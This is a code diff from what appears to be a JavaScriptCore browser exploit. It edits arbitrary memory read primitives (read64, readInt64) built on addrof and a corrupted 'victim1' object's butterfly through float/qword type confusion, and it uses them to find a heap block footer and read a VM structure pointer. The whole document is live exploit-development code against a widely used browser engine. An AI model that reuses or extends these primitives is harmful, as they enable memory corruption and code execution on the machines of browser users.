@@ -545,12 +545,7 @@ for (var i = 0; i < 1000; ++i) {
         },
 
 
-        read64: function(where,offset) {
-            //var reset = hax[1];
-            if(offset) {
-                offset *= 8
-                return this.read64(where+offset);
-            }
+        read64: function(where) {
             hax[1] = qwordAsFloat(where + 0x10);
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
@@ -559,12 +554,12 @@ for (var i = 0; i < 1000; ++i) {
         },
         readInt64: function(where) {
             if (where instanceof Int64) {
-                where = Add(where, 0x10);
+                where = Add(where, new Int64("0x10"));
 		hax[1] = where.asDouble();
 	    } else {
 		hax[1] = qwordAsFloat(where + 0x10);
 	    }
-            hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
+            //hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
             var res = floatAsQword(victim1.prop) //is this a double? //this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
@@ -730,7 +725,7 @@ Proto:0x10a0253e8, Leaf]), StructureID: 11704"*/
 	var objaddr = stage2.addrof(a);
 	var footeraddr = "0x" + ((objaddr & 0xfffc0000) + (((objaddr/0x100000000)|0)*0x100000000)+0x4000-0x130).toString(16);
 	print("footeraddr @ " + footeraddr);
-	var vmstruct = memory.readInt64(Add(footeraddr,0x8));
+	var vmstruct = memory.read64(footeraddr+0x8);
 	print("vmstruct @ " + vmstruct);
 	/*var m_runloop = memory.readInt64(Add(vmstruct,0x10));
 	print("m_runloop @ " + m_runloop);
